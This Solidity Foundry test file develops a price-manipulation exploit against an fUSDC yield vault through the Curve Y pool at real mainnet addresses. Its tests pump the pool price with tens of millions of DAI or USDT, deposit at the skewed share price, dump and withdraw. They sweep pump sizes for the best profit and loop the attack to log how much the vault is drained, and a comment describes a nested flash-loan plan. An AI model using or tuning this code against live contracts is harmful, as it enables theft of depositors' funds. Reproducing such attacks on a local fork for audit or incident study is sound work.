// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestFUSDCFlash2 is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    /// @dev Test with varying pump sizes to find optimal
    function testPumpSizeSweep() public {
        uint256[] memory pumpSizes = new uint256[](5);
        pumpSizes[0] = 50_000_000e18;   // 50M DAI
        pumpSizes[1] = 100_000_000e18;  // 100M DAI
        pumpSizes[2] = 150_000_000e18;  // 150M DAI
        pumpSizes[3] = 200_000_000e18;  // 200M DAI
        pumpSizes[4] = 50_000_000e18;   // 50M DAI (with USDT pump instead)

        for (uint256 s = 0; s < 4; s++) {
            uint256 snapshot = vm.snapshot();

            uint256 daiPump = pumpSizes[s];
            deal(DAI, address(this), daiPump);
            deal(USDC, address(this), 50_000_000e6); // dump capital

            IERC20(DAI).approve(CURVE, type(uint256).max);
            IERC20(USDC).approve(CURVE, type(uint256).max);
            IERC20(USDC).approve(FUSDC, type(uint256).max);

            uint256 ppfsBefore = IHVault(FUSDC).getPricePerFullShare();

            // PUMP
            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(0, 1, daiPump, 0);
            uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

            uint256 ppfsAfterPump = IHVault(FUSDC).getPricePerFullShare();

            // DEPOSIT
            IHVault(FUSDC).deposit(pumpedUSDC);
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));

            // DUMP (use 50M USDC)
            ICurveYPool(CURVE).exchange_underlying(1, 0, 50_000_000e6, 0);

            uint256 ppfsAfterDump = IHVault(FUSDC).getPricePerFullShare();

            // WITHDRAW
            IHVault(FUSDC).withdraw(shares);

            uint256 usdcFinal = IERC20(USDC).balanceOf(address(this));
            uint256 daiFinal = IERC20(DAI).balanceOf(address(this));

            emit log_named_uint("DAI pump size (M)", daiPump / 1e18 / 1e6);
            emit log_named_uint("PPFS before", ppfsBefore);
            emit log_named_uint("PPFS after pump", ppfsAfterPump);
            emit log_named_uint("PPFS after dump", ppfsAfterDump);
            emit log_named_int("USDC net vs 50M capital", int256(usdcFinal) - int256(50_000_000e6));
            emit log_named_int("DAI net vs pump", int256(daiFinal) - int256(daiPump));
            emit log_named_uint("Pumped USDC", pumpedUSDC);
            emit log("---");

            vm.revertTo(snapshot);
        }
    }

    /// @dev Test: use USDT as pump token instead of DAI (USDT -> USDC)
    function testUSDTPump() public {
        deal(USDT, address(this), 50_000_000e6);
        deal(USDC, address(this), 50_000_000e6);

        // USDT approve needs special handling (no return value)
        (bool ok,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", CURVE, type(uint256).max));
        require(ok);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        uint256 ppfsBefore = IHVault(FUSDC).getPricePerFullShare();

        // PUMP: USDT -> USDC (index 2 -> 1)
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        ICurveYPool(CURVE).exchange_underlying(2, 1, 50_000_000e6, 0);
        uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

        uint256 ppfsAfterPump = IHVault(FUSDC).getPricePerFullShare();

        emit log_named_uint("PPFS before", ppfsBefore);
        emit log_named_uint("PPFS after USDT pump", ppfsAfterPump);
        emit log_named_uint("Pumped USDC", pumpedUSDC);

        // DEPOSIT
        IHVault(FUSDC).deposit(pumpedUSDC);
        uint256 shares = IHVault(FUSDC).balanceOf(address(this));

        // DUMP: USDC -> USDT (index 1 -> 2)
        ICurveYPool(CURVE).exchange_underlying(1, 2, 50_000_000e6, 0);

        uint256 ppfsAfterDump = IHVault(FUSDC).getPricePerFullShare();
        emit log_named_uint("PPFS after dump", ppfsAfterDump);

        // WITHDRAW
        IHVault(FUSDC).withdraw(shares);

        uint256 usdcFinal = IERC20(USDC).balanceOf(address(this));
        uint256 usdtFinal = IERC20(USDT).balanceOf(address(this));
        emit log_named_int("USDC net", int256(usdcFinal) - int256(50_000_000e6));
        emit log_named_int("USDT net", int256(usdtFinal) - int256(50_000_000e6));
    }

    /// @dev Test: nested flash approach - flash USDT from one pair, flash USDC from another
    /// Use USDT to pump, deposit USDC, dump USDT back, withdraw
    function testNestedFlashApproach() public {
        // This simulates what a real exploit would look like:
        // Outer flash: USDT from UniV2 USDT/WETH (50M available)
        // Inner flash: USDC from UniV2 USDC/WETH (308M available)

        uint256 usdtFlash = 50_000_000e6;
        uint256 usdcFlash = 10_000_000e6;  // for dump

        deal(USDT, address(this), usdtFlash);
        deal(USDC, address(this), usdcFlash);

        (bool ok,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", CURVE, type(uint256).max));
        require(ok);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        uint256 ppfsBefore = IHVault(FUSDC).getPricePerFullShare();
        uint256 vaultBefore = IHVault(FUSDC).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        uint256 totalProfit = 0;

        for (uint256 i = 0; i < 20; i++) {
            uint256 usdtBal = IERC20(USDT).balanceOf(address(this));
            if (usdtBal < 1_000_000e6) break;

            // PUMP: USDT -> USDC (gets USDC, pump effect)
            uint256 usdcPre = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(2, 1, usdtBal, 0);
            uint256 gotUSDC = IERC20(USDC).balanceOf(address(this)) - usdcPre;

            // DEPOSIT all received USDC
            uint256 depositAmt = gotUSDC;
            IHVault(FUSDC).deposit(depositAmt);
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));

            // DUMP: USDC -> USDT (use some capital USDC to restore)
            uint256 usdcAvail = IERC20(USDC).balanceOf(address(this));
            if (usdcAvail > 0) {
                ICurveYPool(CURVE).exchange_underlying(1, 2, usdcAvail, 0);
            }

            // WITHDRAW
            IHVault(FUSDC).withdraw(shares);

            emit log_named_uint("Iter", i);
            emit log_named_uint("USDC bal", IERC20(USDC).balanceOf(address(this)));
            emit log_named_uint("USDT bal", IERC20(USDT).balanceOf(address(this)));
        }

        uint256 usdcFinal = IERC20(USDC).balanceOf(address(this));
        uint256 usdtFinal = IERC20(USDT).balanceOf(address(this));
        uint256 vaultAfter = IHVault(FUSDC).underlyingBalanceWithInvestment();

        emit log_named_int("Net USDC", int256(usdcFinal) - int256(usdcFlash));
        emit log_named_int("Net USDT", int256(usdtFinal) - int256(usdtFlash));
        emit log_named_uint("Vault USDC after", vaultAfter);
        emit log_named_int("Vault drained", int256(vaultBefore) - int256(vaultAfter));
    }
}
